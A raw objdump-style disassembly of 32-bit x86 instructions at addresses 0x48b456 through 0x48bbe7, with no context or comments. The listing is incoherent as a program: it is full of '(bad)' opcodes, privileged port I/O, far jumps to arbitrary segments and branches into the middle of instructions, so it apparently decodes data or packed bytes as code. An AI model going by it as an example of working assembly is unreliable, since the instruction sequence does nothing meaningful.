  48b456:	ins    BYTE PTR es:[edi],dx
  48b457:	mov    esi,0x97277486
  48b45c:	pop    eax
  48b45d:	dec    eax
  48b45e:	or     eax,0x9db7e80
  48b463:	jl     0x48b455
  48b465:	mov    edx,0xc4160507
  48b46a:	outs   dx,DWORD PTR ds:[esi]
  48b46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b46c:	cmp    al,0xc2
  48b46e:	aad    0x7c
  48b470:	cmp    DWORD PTR [edi+eiz*2+0x39],esi
  48b474:	pop    ebx
  48b475:	xchg   esi,eax
  48b476:	test   BYTE PTR [edi-0x1f0adb26],dh
  48b47c:	rcr    DWORD PTR [eax+0xe],1
  48b47f:	dec    esp
  48b480:	adc    DWORD PTR [esp+ebp*2+0x3902c6b0],ebp
  48b487:	inc    eax
  48b488:	loopne 0x48b448
  48b48a:	add    DWORD PTR [eax],eax
  48b48c:	ins    BYTE PTR es:[edi],dx
  48b48d:	or     ebp,DWORD PTR [ebp+0x3059704d]
  48b493:	cwde   
  48b494:	jno    0x48b50d
  48b496:	pop    esi
  48b497:	xor    BYTE PTR [edx+0x743fef67],0x31
  48b49e:	(bad)  
  48b49f:	dec    esi
  48b4a0:	in     al,dx
  48b4a1:	in     al,dx
  48b4a2:	sbb    bl,BYTE PTR [ebp-0x3487e4e5]
  48b4a8:	jne    0x48b4d2
  48b4aa:	mov    BYTE PTR [esi],bh
  48b4ac:	dec    edx
  48b4ad:	add    eax,0xd0680842
  48b4b2:	jne    0x48b4f4
  48b4b4:	inc    eax
  48b4b5:	jp     0x48b448
  48b4b7:	out    dx,eax
  48b4b8:	inc    esp
  48b4b9:	or     BYTE PTR [eax],bh
  48b4bb:	and    DWORD PTR [ecx],0xd40ea89a
  48b4c1:	sub    al,0x40
  48b4c3:	pop    eax
  48b4c4:	(bad)  
  48b4c5:	iret   
  48b4c6:	xor    al,0x8
  48b4c8:	pop    DWORD PTR [ecx+0x5c671029]
  48b4ce:	sub    BYTE PTR [eax],bh
  48b4d0:	jno    0x48b4f8
  48b4d2:	lds    eax,FWORD PTR [eax]
  48b4d4:	es into 
  48b4d6:	pop    esp
  48b4d7:	mov    al,0x5
  48b4d9:	xchg   edi,eax
  48b4da:	mov    al,ds:0x66b860f6
  48b4df:	mov    DWORD PTR [edx],ecx
  48b4e1:	nop
  48b4e2:	dec    edx
  48b4e3:	lds    ebp,FWORD PTR [ebp+0x3ede6ebb]
  48b4e9:	mov    BYTE PTR ds:[eax],ah
  48b4ec:	int    0x5a
  48b4ee:	inc    esp
  48b4ef:	inc    eax
  48b4f0:	push   ds
  48b4f1:	inc    edx
  48b4f2:	inc    eax
  48b4f3:	sbb    al,0x58
  48b4f5:	rcl    DWORD PTR ds:0xc97448f0,0x6e
  48b4fc:	(bad)  
  48b4fe:	inc    ebx
  48b4ff:	or     edx,ebp
  48b501:	adc    BYTE PTR [ebp-0x3e],dh
  48b504:	ret    
  48b505:	(bad)  
  48b506:	fs push ebp
  48b508:	xor    BYTE PTR [edx],dh
  48b50a:	xor    al,0x34
  48b50c:	lea    eax,[edi]
  48b50e:	xor    ebp,0x9c436103
  48b514:	cmp    esi,eax
  48b516:	cli    
  48b517:	bound  eax,QWORD PTR [edx-0x12d5d6d9]
  48b51d:	int3   
  48b51e:	adc    BYTE PTR [ecx+0x71],bh
  48b521:	dec    ecx
  48b522:	imul   esi,DWORD PTR [esi],0x19
  48b525:	rcl    BYTE PTR [ebx],0x6f
  48b528:	xchg   ebp,eax
  48b529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b52a:	out    0x8b,eax
  48b52c:	or     BYTE PTR [edi+0x19ed23c9],0x6b
  48b533:	sbb    DWORD PTR [ecx],ebp
  48b535:	dec    esp
  48b536:	xor    eax,0xdb5eaf3
  48b53b:	les    esp,FWORD PTR [edx]
  48b53d:	adc    edx,edi
  48b53f:	out    dx,eax
  48b540:	mov    edx,ebx
  48b542:	jmp    0x997:0xb4595e2c
  48b549:	dec    esi
  48b54a:	xor    eax,0x4a743a5d
  48b550:	sbb    BYTE PTR [edx],bh
  48b552:	push   eax
  48b553:	not    BYTE PTR [ecx]
  48b555:	and    BYTE PTR [ebp+0x256d64ca],0x47
  48b55c:	retf   
  48b55d:	rcr    DWORD PTR [edx+0x2e6465a2],cl
  48b563:	cmp    cl,BYTE PTR [esi]
  48b565:	pop    ds
  48b566:	mov    BYTE PTR [edi],0x5b
  48b569:	sub    eax,0xdeaa4099
  48b56e:	mov    BYTE PTR [edx+ebx*1+0x8158b48],al
  48b575:	adc    esp,DWORD PTR [esi]
  48b577:	(bad)  
  48b578:	xor    al,0x26
  48b57a:	dec    esi
  48b57b:	pop    ss
  48b57c:	push   ebp
  48b57d:	add    eax,0xa1c364c
  48b582:	loop   0x48b5f8
  48b584:	dec    BYTE PTR [eax-0x7595788d]
  48b58a:	pop    eax
  48b58b:	push   ds
  48b58c:	(bad)  
  48b58d:	pop    esp
  48b58e:	mov    ecx,DWORD PTR [ecx]
  48b590:	cmp    BYTE PTR [edx+0x2e62ef88],ah
  48b596:	push   eax
  48b597:	push   cs
  48b598:	test   al,0x1f
  48b59a:	jbe    0x48b604
  48b59c:	or     BYTE PTR [ebp+0x26],bh
  48b59f:	ds pop esp
  48b5a1:	xor    ch,BYTE PTR [ebp+0x46ea83fd]
  48b5a7:	aas    
  48b5a8:	jbe    0x48b5be
  48b5aa:	and    ecx,DWORD PTR [eax-0x8]
  48b5ad:	cmp    bh,bh
  48b5af:	fnstenv [esp+eax*1]
  48b5b2:	pop    ss
  48b5b3:	fmul   DWORD PTR [edx+0xa613f4e]
  48b5b9:	aas    
  48b5ba:	inc    ebx
  48b5bb:	rcl    DWORD PTR [ecx+0x103243],1
  48b5c1:	push   es
  48b5c2:	les    esp,FWORD PTR [esi-0x46]
  48b5c5:	mov    DWORD PTR [esi-0x5fc7df96],ebx
  48b5cb:	xchg   edi,eax
  48b5cc:	pop    ebx
  48b5cd:	cmp    al,0xac
  48b5cf:	push   edi
  48b5d0:	pop    ss
  48b5d1:	push   cs
  48b5d2:	popa   
  48b5d3:	xor    cl,BYTE PTR ds:0x6052170c
  48b5d9:	ins    BYTE PTR es:[edi],dx
  48b5da:	adc    edi,esi
  48b5dc:	test   eax,ebp
  48b5de:	or     ah,BYTE PTR [eax]
  48b5e0:	mov    ?,WORD PTR [edi]
  48b5e2:	adc    esp,ecx
  48b5e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b5e5:	mov    dh,0xb3
  48b5e7:	out    0x7b,al
  48b5e9:	pop    esp
  48b5ea:	push   ecx
  48b5eb:	xchg   BYTE PTR [ebp+0x7fc0619c],bh
  48b5f1:	pusha  
  48b5f2:	push   ss
  48b5f3:	xor    BYTE PTR [eax-0x64],ch
  48b5f6:	mov    ecx,0x64aa6877
  48b5fb:	or     BYTE PTR [edi+0x6cfb0ae3],al
  48b601:	imul   esp,DWORD PTR [edi-0x1653182b],0x8e035ee7
  48b60b:	and    eax,0x9ede3926
  48b610:	gs out 0xa3,eax
  48b613:	add    eax,0xa8da5408
  48b618:	add    BYTE PTR [eax],ah
  48b61a:	call   0x121:0x44f45b26
  48b621:	sbb    bl,0x61
  48b624:	adc    esi,DWORD PTR [ebp+0x16]
  48b627:	xor    eax,0x1a6a1274
  48b62c:	scas   eax,DWORD PTR es:[edi]
  48b62d:	dec    eax
  48b62e:	cmp    BYTE PTR [eax-0x66],dl
  48b631:	xchg   ecx,eax
  48b632:	arpl   WORD PTR [edx],dx
  48b634:	mov    esi,0x1f2d2d8a
  48b639:	and    al,BYTE PTR [eax+0xb4a4b65]
  48b63f:	mov    BYTE PTR [eax],al
  48b641:	xchg   ebp,eax
  48b642:	xchg   esp,eax
  48b643:	pop    esi
  48b644:	add    ebx,DWORD PTR [ebx]
  48b646:	jmp    0x48b678
  48b648:	or     ebx,eax
  48b64a:	ins    BYTE PTR es:[edi],dx
  48b64b:	enter  0x44c8,0x44
  48b64f:	popf   
  48b650:	push   cs
  48b651:	arpl   WORD PTR [ebx+0x179120b2],cx
  48b657:	mov    al,0xf1
  48b659:	adc    dh,al
  48b65b:	bnd jo 0x48b6ba
  48b65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b65f:	gs cmp al,0x65
  48b662:	cmp    eax,0xbd0ef007
  48b667:	mov    ds:0xcb3f9b05,eax
  48b66c:	ss into 
  48b66e:	adc    eax,0x102d94e9
  48b673:	mov    ds:0x494e33c7,al
  48b678:	pop    esi
  48b679:	cmp    eax,0xe01a1000
  48b67e:	jb     0x48b6a1
  48b680:	aam    0x36
  48b682:	jbe    0x48b6b7
  48b684:	sbb    dh,BYTE PTR [edi+eiz*4-0x3c]
  48b688:	in     al,0x4a
  48b68a:	addr16 inc ebx
  48b68c:	push   ss
  48b68d:	jl     0x48b685
  48b68f:	inc    ebx
  48b690:	(bad)  
  48b692:	add    bh,BYTE PTR [ebx]
  48b694:	(bad)  
  48b695:	in     al,0x36
  48b697:	mov    esi,0xf0531182
  48b69c:	test   ecx,ebp
  48b69e:	ins    BYTE PTR es:[edi],dx
  48b69f:	mov    al,0x78
  48b6a1:	xchg   BYTE PTR [ebp+edi*1+0x24778096],al
  48b6a8:	je     0x48b65a
  48b6aa:	ds or  eax,0x5e1303d8
  48b6b0:	sub    eax,0x62368a9
  48b6b5:	adc    ch,BYTE PTR [ebp+edi*1+0xd]
  48b6b9:	loopne 0x48b6aa
  48b6bb:	adc    BYTE PTR [esi],dh
  48b6bd:	pop    es
  48b6be:	hlt    
  48b6bf:	sbb    al,0x38
  48b6c1:	jmp    0x48b6de
  48b6c3:	xlat   BYTE PTR ds:[ebx]
  48b6c4:	stos   BYTE PTR es:[edi],al
  48b6c5:	jo     0x48b6e8
  48b6c7:	iret   
  48b6c8:	jno    0x48b6b1
  48b6ca:	xlat   BYTE PTR ds:[ebx]
  48b6cb:	push   0xffffff99
  48b6cd:	js     0x48b708
  48b6cf:	inc    eax
  48b6d0:	mov    bh,0x91
  48b6d2:	pushf  
  48b6d3:	outs   dx,BYTE PTR ds:[esi]
  48b6d4:	jmp    0x1fba0381
  48b6d9:	inc    ebx
  48b6da:	dec    esp
  48b6db:	pusha  
  48b6dc:	jmp    0xc50e:0x9d08cc2e
  48b6e3:	ss stc 
  48b6e5:	inc    eax
  48b6e6:	(bad)  
  48b6e7:	jnp    0xeb5afb30
  48b6ed:	dec    edi
  48b6ee:	mov    bh,0x13
  48b6f0:	rol    al,cl
  48b6f2:	aam    0xab
  48b6f4:	out    dx,al
  48b6f5:	inc    esp
  48b6f6:	dec    edx
  48b6f7:	mov    esi,0x44443c8c
  48b6fc:	push   eax
  48b6fd:	das    
  48b6fe:	inc    esp
  48b6ff:	sub    al,cl
  48b701:	jo     0x48b738
  48b703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b704:	addr16 xor eax,0xf775a320
  48b70a:	inc    esi
  48b70b:	dec    esp
  48b70c:	push   esp
  48b70d:	or     BYTE PTR [ebx],bl
  48b70f:	jp     0x48b727
  48b711:	mov    ah,0x5d
  48b713:	add    eax,0x95c8f67
  48b718:	xchg   ecx,eax
  48b719:	jmp    0x48b6d0
  48b71b:	adc    eax,0x65f548ff
  48b720:	inc    esp
  48b721:	sub    eax,0xafeeac
  48b726:	pop    ds
  48b727:	lock (bad) 
  48b729:	out    0xa,al
  48b72b:	cmp    DWORD PTR [edx+0x70],0x0
  48b72f:	loop   0x48b7a1
  48b731:	ret    
  48b732:	add    ebx,eax
  48b734:	adc    al,0xe0
  48b736:	iret   
  48b737:	int    0x7
  48b739:	retf   0xe289
  48b73c:	mov    al,ds:0x37208fb8
  48b741:	enter  0xc65,0x3a
  48b745:	mov    DWORD PTR [edi+0xa],esp
  48b748:	pop    eax
  48b749:	cmp    eax,0x1d1aebb0
  48b74e:	jno    0x48b6db
  48b750:	add    eax,0x362338dc
  48b755:	call   0x6fb9b816
  48b75a:	loope  0x48b7c0
  48b75c:	dec    esp
  48b75d:	idiv   BYTE PTR [ebx]
  48b75f:	cwde   
  48b760:	(bad)  
  48b761:	retf   0x3adf
  48b764:	push   ebx
  48b765:	cmp    eax,0x8881f74
  48b76a:	cmp    al,0x9
  48b76c:	dec    edx
  48b76d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b76e:	pop    es
  48b76f:	adc    DWORD PTR [ebx-0x3d],edi
  48b772:	xchg   esp,eax
  48b773:	or     BYTE PTR [ebp+eax*4-0x35],cl
  48b777:	mul    DWORD PTR [esi-0x4a69dd1b]
  48b77d:	sti    
  48b77e:	mov    ds:0x91e24fec,al
  48b783:	mov    esi,0xda878a0c
  48b788:	mov    BYTE PTR [esi-0x2da7ce58],al
  48b78e:	fcmovnb st,st(2)
  48b790:	push   es
  48b791:	es (bad) 
  48b794:	pop    ss
  48b795:	mov    cl,0xa5
  48b797:	jle    0x48b7c0
  48b799:	lock sub al,BYTE PTR [edi+0x5e]
  48b79d:	outs   dx,BYTE PTR ds:[esi]
  48b79e:	mov    dl,BYTE PTR es:[edi+0x69]
  48b7a2:	pop    ss
  48b7a3:	or     al,0x39
  48b7a5:	add    DWORD PTR [edx-0x67],ebp
  48b7a8:	jp     0x48b776
  48b7aa:	inc    esi
  48b7ab:	pusha  
  48b7ac:	ja     0x48b802
  48b7ae:	mov    dh,0x37
  48b7b0:	xor    DWORD PTR [ebx+0x50],ebp
  48b7b3:	call   0x58680c8e
  48b7b8:	xor    BYTE PTR [ebx],ah
  48b7ba:	sub    al,0x96
  48b7bc:	je     0x48b74b
  48b7be:	inc    esi
  48b7bf:	pop    eax
  48b7c0:	xlat   BYTE PTR ds:[ebx]
  48b7c1:	ja     0x48b80a
  48b7c3:	xchg   di,ax
  48b7c5:	pop    ecx
  48b7c6:	adc    al,0xa5
  48b7c8:	aas    
  48b7c9:	ins    BYTE PTR es:[edi],dx
  48b7ca:	jge    0x48b7a4
  48b7cc:	inc    eax
  48b7cd:	(bad)  
  48b7ce:	shr    DWORD PTR ds:[eax+0x7597c609],0xe9
  48b7d6:	mov    WORD PTR [ebp-0x5],gs
  48b7d9:	call   0xe56:0x607ea922
  48b7e0:	data16 xor BYTE PTR [edx+esi*8+0x6821d259],al
  48b7e8:	imul   edi,DWORD PTR [esi],0x3c
  48b7eb:	in     al,0xc8
  48b7ed:	add    eax,DWORD PTR [eax+ebx*1]
  48b7f0:	jl     0x48b77c
  48b7f2:	add    BYTE PTR [eax-0x4f12bb00],cl
  48b7f8:	mov    ch,BYTE PTR [ebp+0x47]
  48b7fb:	pop    ecx
  48b7fc:	rcr    BYTE PTR [edi-0x75],cl
  48b7ff:	aad    0x1f
  48b801:	cmp    edi,eax
  48b803:	dec    eax
  48b804:	pusha  
  48b805:	enter  0x26c7,0xa6
  48b809:	(bad)  
  48b80a:	and    al,0xcf
  48b80c:	xchg   edx,eax
  48b80d:	push   cs
  48b80e:	dec    edi
  48b80f:	push   ss
  48b810:	inc    esp
  48b811:	jb     0x48b7a4
  48b813:	pop    esp
  48b814:	dec    ebx
  48b815:	aas    
  48b816:	and    al,0x28
  48b818:	and    al,0x17
  48b81a:	leave  
  48b81b:	inc    ebp
  48b81c:	cmp    BYTE PTR [eax],dh
  48b81e:	inc    ebp
  48b81f:	jb     0x48b7b2
  48b821:	pop    esp
  48b822:	cmp    al,0x40
  48b824:	and    BYTE PTR [edi+edx*1],ah
  48b827:	leave  
  48b828:	inc    esp
  48b829:	or     BYTE PTR [esi],cl
  48b82b:	loop   0x48b802
  48b82d:	and    al,0xe7
  48b82f:	je     0x48b884
  48b831:	mov    al,BYTE PTR [ecx-0x7a]
  48b834:	dec    ecx
  48b835:	ror    BYTE PTR [ebx-0x2eab4802],0x1a
  48b83c:	imul   edx,DWORD PTR [ecx-0x37bfeda8],0xd259b907
  48b846:	cmp    al,0x43
  48b848:	mov    WORD PTR ds:[eax],es
  48b84b:	add    ch,0x4a
  48b84e:	mov    BYTE PTR ds:[eax],al
  48b851:	jge    0x48b7f9
  48b853:	loop   0x48b7d7
  48b855:	pop    ecx
  48b856:	jg     0x48b88c
  48b858:	popf   
  48b859:	or     ecx,edx
  48b85b:	aam    0x67
  48b85d:	and    al,0x77
  48b85f:	sbb    al,0xb8
  48b861:	jmp    0x48b881
  48b863:	gs stos BYTE PTR es:[edi],al
  48b865:	jns    0x48b81e
  48b867:	fistp  DWORD PTR [edi]
  48b869:	and    DWORD PTR [ebx+ebp*8+0xe],ebx
  48b86d:	push   0x5f2202d5
  48b872:	iret   
  48b873:	add    edi,ebx
  48b875:	loopne 0x48b81e
  48b877:	enter  0x9065,0xcb
  48b87b:	jl     0x48b8f5
  48b87d:	jl     0x48b8f7
  48b87f:	sbb    BYTE PTR [edi+0x3],ch
  48b882:	xor    DWORD PTR [edi+esi*8-0x66],edi
  48b886:	int3   
  48b887:	ds pop esi
  48b889:	retf   
  48b88a:	dec    esp
  48b88b:	das    
  48b88c:	rol    BYTE PTR ds:0x49f0671d,0x2c
  48b893:	xor    al,0x80
  48b895:	mov    eax,0x90ce16a8
  48b89a:	pop    es
  48b89b:	popa   
  48b89c:	mov    al,ds:0x83d86d00
  48b8a1:	rcl    eax,0xf4
  48b8a4:	and    BYTE PTR [ecx],0x38
  48b8a7:	jb     0x48b887
  48b8a9:	bound  edi,QWORD PTR [ebp+0x43bafe0b]
  48b8af:	cli    
  48b8b0:	push   0x67ad4592
  48b8b5:	sub    eax,0xcb6d8fa6
  48b8ba:	mov    dl,BYTE PTR [esi-0x582c9849]
  48b8c0:	test   BYTE PTR [edi+0x48],ch
  48b8c3:	nop
  48b8c4:	es add edx,0xffffff8b
  48b8c8:	ret    0x4244
  48b8cb:	jecxz  0x48b85f
  48b8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b8ce:	imul   esi,DWORD PTR [eax],0xffffff89
  48b8d1:	xor    al,0x57
  48b8d3:	jne    0x48b91c
  48b8d5:	or     cl,ch
  48b8d7:	add    BYTE PTR [ebx+0xcd1417],dh
  48b8dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b8de:	pop    eax
  48b8df:	sub    esp,0x3632531f
  48b8e5:	xor    esi,DWORD PTR [ecx]
  48b8e7:	sub    DWORD PTR [ebx-0x5c],esp
  48b8ea:	or     eax,0x1b5031f6
  48b8ef:	pushf  
  48b8f0:	xor    BYTE PTR [ecx+0x68],bl
  48b8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b8f4:	fwait
  48b8f5:	or     BYTE PTR [ebp+0x8e8f3d2],dh
  48b8fb:	arpl   WORD PTR [ebp+0x50343923],ax
  48b901:	add    esp,DWORD PTR [esp+ecx*1]
  48b904:	or     BYTE PTR [edi],dl
  48b906:	loope  0x48b8a9
  48b908:	xor    al,0x22
  48b90a:	pop    edi
  48b90b:	mov    edx,0x13a74433
  48b910:	cmc    
  48b911:	popa   
  48b912:	dec    eax
  48b913:	mov    dh,0xbf
  48b915:	ret    
  48b916:	test   BYTE PTR fs:[eax],al
  48b919:	mov    edi,0x3a548a16
  48b91e:	dec    DWORD PTR [ebx-0x1ef2f97a]
  48b924:	int    0x4
  48b926:	ins    DWORD PTR es:[edi],dx
  48b927:	adc    DWORD PTR [ebx+0x4],esi
  48b92a:	pop    ebp
  48b92b:	es je  0x48b972
  48b92e:	add    al,0xe0
  48b930:	loope  0x48b920
  48b932:	das    
  48b933:	or     bh,dl
  48b935:	xor    BYTE PTR [ebx+0x1e],0xed
  48b939:	mov    bh,0x25
  48b93b:	ins    DWORD PTR es:[edi],dx
  48b93c:	jne    0x48b950
  48b93e:	add    eax,DWORD PTR [edx+0x18]
  48b941:	mov    ecx,0xa0b4ec2d
  48b946:	add    esp,DWORD PTR [ecx+0x3b]
  48b949:	mov    al,0x30
  48b94b:	stc    
  48b94c:	(bad)  
  48b94d:	shl    BYTE PTR [ebx],1
  48b94f:	lods   eax,DWORD PTR ds:[esi]
  48b950:	push   edi
  48b951:	out    0x7,eax
  48b953:	fnstcw WORD PTR [esi-0x38]
  48b956:	sub    ecx,0x3
  48b959:	push   esp
  48b95a:	mov    edx,0xf075ff01
  48b95f:	push   0xedca70dc
  48b964:	adc    al,0x20
  48b966:	or     BYTE PTR [eax],bl
  48b968:	cld    
  48b969:	push   0x4efd79f4
  48b96e:	mov    ds:0x9b0656d3,al
  48b973:	jmp    0x48b9ac
  48b975:	push   DWORD PTR [esi]
  48b977:	es push cs
  48b979:	jns    0x48b924
  48b97b:	dec    ebp
  48b97c:	inc    edx
  48b97d:	add    eax,0x9022cf15
  48b982:	or     DWORD PTR [ebx-0x38],0xb46101b8
  48b989:	jo     0x48b9d6
  48b98b:	and    ecx,DWORD PTR [ebx+ebp*4+0xa]
  48b98f:	or     BYTE PTR [edi+ecx*1],ah
  48b992:	shl    DWORD PTR [ebx],0x44
  48b995:	or     eax,0x4f6eec83
  48b99a:	add    BYTE PTR cs:[edi-0x64a31ed8],ah
  48b9a1:	push   es
  48b9a2:	mov    edi,0xd3291726
  48b9a7:	mov    ah,0xc1
  48b9a9:	or     al,0x97
  48b9ab:	add    al,0xbc
  48b9ad:	shr    BYTE PTR [ecx+0x37],0x93
  48b9b1:	inc    esp
  48b9b2:	les    eax,FWORD PTR [edi-0x34]
  48b9b5:	add    al,0xfc
  48b9b7:	lahf   
  48b9b8:	jl     0x48ba02
  48b9ba:	mov    esp,0xe75588e8
  48b9bf:	pop    ss
  48b9c0:	xchg   edi,eax
  48b9c1:	cmp    dh,al
  48b9c3:	inc    ebp
  48b9c4:	out    0x98,al
  48b9c6:	push   0xe70c1035
  48b9cb:	bound  edx,QWORD PTR [edi+0x12]
  48b9ce:	scas   eax,DWORD PTR es:[edi]
  48b9cf:	push   0x2a991ab1
  48b9d4:	sbb    bl,BYTE PTR [ebx]
  48b9d6:	test   DWORD PTR [ecx+0x1c0b0a48],0x69729c3d
  48b9e0:	sub    al,0x80
  48b9e2:	and    eax,0xb1a5f430
  48b9e7:	adc    dh,al
  48b9e9:	sbb    DWORD PTR [ecx-0x49],ebx
  48b9ec:	test   BYTE PTR [ecx],ah
  48b9ee:	ins    DWORD PTR es:[edi],dx
  48b9ef:	scas   al,BYTE PTR es:[edi]
  48b9f0:	pop    eax
  48b9f1:	das    
  48b9f2:	es bound eax,QWORD PTR fs:[edi]
  48b9f6:	hlt    
  48b9f7:	sbb    eax,0x76a6e0ec
  48b9fc:	bound  eax,QWORD PTR [edx-0x8]
  48b9ff:	leave  
  48ba00:	push   esi
  48ba01:	retf   0xbca8
  48ba04:	nop
  48ba05:	add    eax,DWORD PTR [ecx]
  48ba07:	enter  0x1997,0x69
  48ba0b:	mov    ds:0x493eb133,eax
  48ba10:	inc    ebp
  48ba11:	jle    0x48ba15
  48ba13:	arpl   WORD PTR ds:0x9f38b078,sp
  48ba19:	inc    ebp
  48ba1a:	add    eax,0x85c436a4
  48ba1f:	mov    cl,0x9f
  48ba21:	add    esi,0x62
  48ba24:	pop    ebp
  48ba25:	mov    BYTE PTR [ebx+eax*2],dl
  48ba28:	and    BYTE PTR [eax-0x7419726e],dh
  48ba2e:	inc    ebp
  48ba2f:	(bad)  
  48ba30:	aam    0xf3
  48ba32:	imul   eax,edi,0x75aac11e
  48ba38:	and    cl,BYTE PTR [ecx+0x50]
  48ba3b:	pop    ebp
  48ba3c:	mov    eax,0x48a16091
  48ba41:	adc    cl,BYTE PTR [ebp+ecx*8+0x64]
  48ba45:	jmp    0x48bab1
  48ba47:	cmc    
  48ba48:	mov    esi,0x1e1965a9
  48ba4d:	aam    0xfd
  48ba4f:	je     0x48baa9
  48ba51:	push   ebp
  48ba52:	sbb    DWORD PTR [edi+0x7b],ecx
  48ba55:	mov    dl,0x51
  48ba57:	mov    al,0xe0
  48ba59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ba5a:	dec    edx
  48ba5b:	repz shl BYTE PTR [eax],0x50
  48ba5f:	or     ch,ch
  48ba61:	addr16 (bad) 
  48ba63:	out    0xc0,eax
  48ba65:	inc    edx
  48ba66:	mov    BYTE PTR [ebx-0x1d5da7f2],cl
  48ba6c:	inc    ebx
  48ba6d:	int    0xcb
  48ba6f:	xlat   BYTE PTR ds:[ebx]
  48ba70:	inc    esi
  48ba71:	dec    DWORD PTR [ebp-0x38]
  48ba74:	and    al,0x3
  48ba76:	xchg   edi,eax
  48ba77:	imul   eax,DWORD PTR ds:0x2e8dcee3,0x936938a5
  48ba81:	xorps  xmm0,XMMWORD PTR [edi+0x3d]
  48ba85:	data16 ds cld 
  48ba88:	push   0x9
  48ba8a:	bound  esp,QWORD PTR [esp+ecx*8-0x43d2f9ab]
  48ba91:	jnp    0x48ba48
  48ba93:	lds    edi,FWORD PTR [edi-0x6b9ae1bc]
  48ba99:	nop
  48ba9a:	shr    BYTE PTR [esi-0x463b95ff],1
  48baa0:	jo     0x48bad9
  48baa2:	inc    edx
  48baa3:	ret    0xa5d6
  48baa6:	mov    ebx,0xd06f4d8c
  48baab:	xor    eax,DWORD PTR [esi-0x752fcdda]
  48bab1:	inc    esp
  48bab2:	sbb    al,ah
  48bab4:	adc    eax,0x2a99fc61
  48bab9:	and    eax,0x37302df
  48babe:	inc    ebx
  48babf:	jmp    0x48bb39
  48bac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48bac2:	jnp    0x48bb10
  48bac4:	cmp    eax,0x48d3e926
  48bac9:	mov    cl,0x3a
  48bacb:	xor    BYTE PTR [ecx+eiz*8+0x740579bc],al
  48bad2:	dec    esp
  48bad3:	and    ebx,ecx
  48bad5:	push   ecx
  48bad6:	add    al,BYTE PTR [ecx+0xf]
  48bad9:	ins    BYTE PTR es:[edi],dx
  48bada:	xor    al,0x36
  48badc:	std    
  48badd:	mov    ah,0x77
  48badf:	dec    ebx
  48bae0:	add    al,0x22
  48bae2:	xchg   esp,eax
  48bae3:	jmp    0x48bb01
  48bae5:	push   ebp
  48bae6:	mov    eax,0xdc2138bc
  48baeb:	in     al,0x8b
  48baed:	xor    BYTE PTR [esi-0x14],ah
  48baf0:	xor    al,0x7e
  48baf2:	in     al,dx
  48baf3:	and    DWORD PTR [ebp+esi*4+0x3c],ebp
  48baf7:	sub    eax,0x4311eb48
  48bafc:	int3   
  48bafd:	wbinvd 
  48baff:	retf   0xf1db
  48bb02:	pop    ebp
  48bb03:	jo     0x48bb1f
  48bb05:	(bad)  
  48bb06:	push   ss
  48bb07:	mov    eax,0x8ab13c2a
  48bb0c:	ins    BYTE PTR es:[edi],dx
  48bb0d:	pop    ebp
  48bb0e:	mov    edi,0xf97ebc14
  48bb13:	popa   
  48bb14:	pop    edi
  48bb15:	and    DWORD PTR [eax-0x28a6efde],edi
  48bb1b:	or     BYTE PTR [edi+edx*1-0x43],0x2d
  48bb20:	repnz inc edx
  48bb22:	cmp    eax,0xe0d8df34
  48bb27:	fdiv   DWORD PTR [eax+0x5c13d0b4]
  48bb2d:	dec    esp
  48bb2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bb2f:	test   DWORD PTR [esi+0x49082ad6],ebx
  48bb35:	sub    eax,0x315a70e0
  48bb3a:	or     bl,dh
  48bb3c:	inc    ebp
  48bb3d:	iret   
  48bb3e:	add    ebx,DWORD PTR [esi+0x133171fe]
  48bb44:	inc    esi
  48bb45:	call   0xa661:0x47c819c9
  48bb4c:	sbb    BYTE PTR [ebx],0x61
  48bb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48bb50:	add    BYTE PTR [esi-0x3cde469f],ah
  48bb56:	clc    
  48bb57:	and    esp,DWORD PTR [edi-0x53]
  48bb5a:	aas    
  48bb5b:	ss or  al,0xce
  48bb5e:	add    DWORD PTR [ebp+0x75],edi
  48bb61:	push   esi
  48bb62:	and    DWORD PTR [ebp*4+0x2d50bd91],ecx
  48bb69:	aas    
  48bb6a:	add    bh,BYTE PTR [ecx+ecx*2-0x567d5f68]
  48bb71:	and    BYTE PTR [esi],cl
  48bb73:	das    
  48bb74:	ret    
  48bb75:	cmc    
  48bb76:	sbb    eax,0xc6541ef0
  48bb7b:	xchg   edx,eax
  48bb7c:	out    dx,al
  48bb7d:	inc    esi
  48bb7e:	test   eax,0xd2cfa08e
  48bb83:	inc    edi
  48bb84:	and    BYTE PTR es:[ecx],ch
  48bb87:	mov    edx,0x746e3ea1
  48bb8c:	lock not ebp
  48bb8f:	push   cs
  48bb90:	mov    eax,0xac3aeee3
  48bb95:	cmp    DWORD PTR [ebx-0x19a0949e],esp
  48bb9b:	ret    
  48bb9c:	sbb    ch,BYTE PTR [eax+esi*4+0x7036f2d7]
  48bba3:	push   ebx
  48bba4:	mov    DWORD PTR [ebx-0xb],edi
  48bba7:	fsubr  DWORD PTR [ecx+0x31]
  48bbaa:	rol    dh,0x39
  48bbad:	sahf   
  48bbae:	das    
  48bbaf:	jo     0x48bbfe
  48bbb1:	adc    BYTE PTR [esp+ecx*8],dh
  48bbb4:	iret   
  48bbb5:	call   0x8073ac7a
  48bbba:	ins    DWORD PTR es:[edi],dx
  48bbbb:	into   
  48bbbc:	mov    dl,BYTE PTR [esi+0xb]
  48bbbf:	imul   eax,DWORD PTR [eax+0x2da7bf15],0xea7c8213
  48bbc9:	cmp    dl,BYTE PTR [eax+0x3b]
  48bbcc:	pop    esi
  48bbcd:	cmp    ebx,eax
  48bbcf:	push   es
  48bbd0:	rcl    BYTE PTR [eax-0x390f4956],1
  48bbd6:	adc    eax,0xcfa71236
  48bbdb:	mov    bh,0x30
  48bbdd:	imul   ecx,DWORD PTR [ecx+0x20],0x30
  48bbe1:	cli    
  48bbe2:	test   eax,0x96052b3c
  48bbe7:	inc    esi
